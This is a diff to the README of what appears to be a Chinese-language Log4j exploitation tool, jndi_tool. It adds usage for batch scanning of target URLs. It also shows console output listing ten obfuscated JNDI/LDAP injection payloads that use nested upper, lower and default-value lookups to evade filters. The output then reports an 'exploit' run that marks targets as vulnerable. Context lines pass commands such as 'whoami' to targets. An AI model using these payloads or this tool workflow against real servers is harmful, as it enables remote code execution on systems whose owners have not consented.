@@ -25,6 +25,61 @@ log4j:
 java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j 127.0.0.1 80 "whoami" http://target  w=tomcat/groory/http  default:http
 java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx
 java -cp jndi_tool.jar jndi.log4j.Tamper "${jndi:ldap://127.0.0.1/a}" all=true random=true
+java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.txt
+
+
+# 2021-12-27 新增log4j批量检测
+
+> java -cp jndi_tool.jar jndi.log4j.Log4j vps_ip 8099 url=http://xx.xx.xx
+[-] LDAP Listening on 0.0.0.0:80
+0. ${jndi:ldap://********/xobject}
+1. ${jndi:ldap://127.0.0.1#********/xobject}
+2. ${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}${upper:d}${upper:a}${upper:p}://********/xobject}
+3. ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://********/xobject}
+4. ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://********/xobject}
+5. ${${spH::-j}${Gdt:zhN:-n}${YCJe::-d}${t:bbru:-i}:${irS:LbN:-l}${m:vjW:-d}${UFd:VVf:-a}${W::-p}://********/xobject}
+6. ${${bQjc::cQT:-j}${fQLP:NAJR:-n}${Ko:c:G:lbhy:-d}${:GXH::Sd:-i}:${MEU:TXgc:VRc:-l}${A:eMJA:qA:kNXt:-d}${:W::-a}${JbuH:Pbq:IDW:-p}://********/xobject}
+7. ${${lower:${lower:${lower:j}}}${lower:${lower:n}}${lower:d}${lower:i}:${lower:${lower:l}}${lower:${lower:${lower:d}}}${lower:${lower:${lower:${lower:${lower:a}}}}}${lower:${lower:p}}://********/xobject}
+8. ${${upper:${upper:j}}${upper:${upper:${upper:n}}}${upper:${upper:${upper:${upper:${upper:d}}}}}${upper:${upper:i}}:${upper:${upper:${upper:l}}}${upper:d}${upper:${upper:${upper:a}}}${upper:${upper:${upper:${upper:p}}}}://********/xobject}
+9. ${${upper:${upper:${lower:j}}}${upper:${lower:n}}${lower:${upper:${lower:d}}}${upper:${lower:i}}:${upper:l}${upper:${upper:d}}${lower:${upper:a}}${upper:${lower:${lower:p}}}://********/xobject}
+[-] please chosse payload, or input payload like payload=${......}
+> 4
+[-] payload: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://****/xobject}
+
+> threads: 1
+> url count: 1
+[-] start exploit. waiting...
+>> target is vul: http://xx.xx.xx
+[-] waiting exit...
+[-] exit.         
+
+
+> java -cp jndi_tool.jar jndi.log4j.Log4j vps_ip 8099 urls=1.txt
+[-] LDAP Listening on 0.0.0.0:80
+0. ${jndi:ldap://********/xobject}
+1. ${jndi:ldap://127.0.0.1#********/xobject}
+2. ${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}${upper:d}${upper:a}${upper:p}://********/xobject}
+3. ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://********/xobject}
+4. ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://********/xobject}
+5. ${${spH::-j}${Gdt:zhN:-n}${YCJe::-d}${t:bbru:-i}:${irS:LbN:-l}${m:vjW:-d}${UFd:VVf:-a}${W::-p}://********/xobject}
+6. ${${bQjc::cQT:-j}${fQLP:NAJR:-n}${Ko:c:G:lbhy:-d}${:GXH::Sd:-i}:${MEU:TXgc:VRc:-l}${A:eMJA:qA:kNXt:-d}${:W::-a}${JbuH:Pbq:IDW:-p}://********/xobject}
+7. ${${lower:${lower:${lower:j}}}${lower:${lower:n}}${lower:d}${lower:i}:${lower:${lower:l}}${lower:${lower:${lower:d}}}${lower:${lower:${lower:${lower:${lower:a}}}}}${lower:${lower:p}}://********/xobject}
+8. ${${upper:${upper:j}}${upper:${upper:${upper:n}}}${upper:${upper:${upper:${upper:${upper:d}}}}}${upper:${upper:i}}:${upper:${upper:${upper:l}}}${upper:d}${upper:${upper:${upper:a}}}${upper:${upper:${upper:${upper:p}}}}://********/xobject}
+9. ${${upper:${upper:${lower:j}}}${upper:${lower:n}}${lower:${upper:${lower:d}}}${upper:${lower:i}}:${upper:l}${upper:${upper:d}}${lower:${upper:a}}${upper:${lower:${lower:p}}}://********/xobject}
+[-] please chosse payload, or input payload like payload=${......}
+> 4
+[-] payload: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://********/xobject}
+
+> threads: 2
+> url count: 2
+[-] start exploit. waiting...
+>> target is vul: http://xx.xx.xx
+>> target is vul: http://xx.xx.xx
+[-] waiting exit...
+[-] exit. 
+
+
+
 
 # 2021-12-24 优化了细节
 # 2021-12-18 优化了细节
